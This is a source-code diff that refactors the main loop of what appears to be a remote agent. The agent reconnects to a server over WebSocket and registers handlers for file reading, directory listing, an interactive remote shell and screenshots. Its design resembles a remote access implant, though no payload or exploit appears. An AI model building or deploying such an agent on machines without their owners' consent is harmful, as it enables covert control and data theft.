@@ -48,7 +48,6 @@ INT32 start()
     }
     Span<const CHAR> urlSpan(urlBuffer, urlLen); // exclude null terminator (ParseUrl bounds on Span size)
 
-    Context context;
     UINT32 connectionAttempt = 0;
 
     CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
@@ -57,24 +56,32 @@ INT32 start()
     commandHandlers[CommandType::Command_Exit] = Handle_ExitCommand;
 #if SUPPORT_FILESYSTEM
     commandHandlers[CommandType::Command_GetDirectoryContent] = Handle_GetDirectoryContentCommand;
-    commandHandlers[CommandType::Command_GetFileContent]      = Handle_GetFileContentCommand;
-    commandHandlers[CommandType::Command_GetFileChunkHash]    = Handle_GetFileChunkHashCommand;
+    commandHandlers[CommandType::Command_GetFileContent] = Handle_GetFileContentCommand;
+    commandHandlers[CommandType::Command_GetFileChunkHash] = Handle_GetFileChunkHashCommand;
 #endif
 #if SUPPORT_SHELL
-    commandHandlers[CommandType::Command_OpenShell]  = Handle_OpenShellCommand;
+    commandHandlers[CommandType::Command_OpenShell] = Handle_OpenShellCommand;
     commandHandlers[CommandType::Command_CloseShell] = Handle_CloseShellCommand;
-    commandHandlers[CommandType::Command_ReadShell]  = Handle_ReadShellCommand;
+    commandHandlers[CommandType::Command_ReadShell] = Handle_ReadShellCommand;
     commandHandlers[CommandType::Command_WriteShell] = Handle_WriteShellCommand;
 #endif
 #if SUPPORT_DISPLAY
-    commandHandlers[CommandType::Command_GetDisplays]   = Handle_GetDisplaysCommand;
+    commandHandlers[CommandType::Command_GetDisplays] = Handle_GetDisplaysCommand;
     commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
 #endif
 
     LOG_INFO("Agent starting, registered %d command handlers", (INT32)CommandType::CommandTypeCount);
 
-    while (!context.shouldExit)
+    // The reconnect loop must outlive the per-connection Context, so the exit
+    // flag lives outside it and is copied out when a session ends.
+    BOOL shouldExit = false;
+    while (!shouldExit)
     {
+        // Context is scoped to a single connection: destroying it on disconnect
+        // tears down all open shells and the screen-capture state, so every
+        // reconnection starts from a clean slate.
+        Context context;
+
         connectionAttempt++;
         LOG_INFO("Connection attempt #%u to %s", connectionAttempt, (PCCHAR)urlBuffer);
 
@@ -145,6 +152,7 @@ INT32 start()
         }
 
         LOG_WARNING("WebSocket session ended after %u messages, will attempt reconnection", messageCount);
+        shouldExit = context.shouldExit;
     }
     return 1;
 }
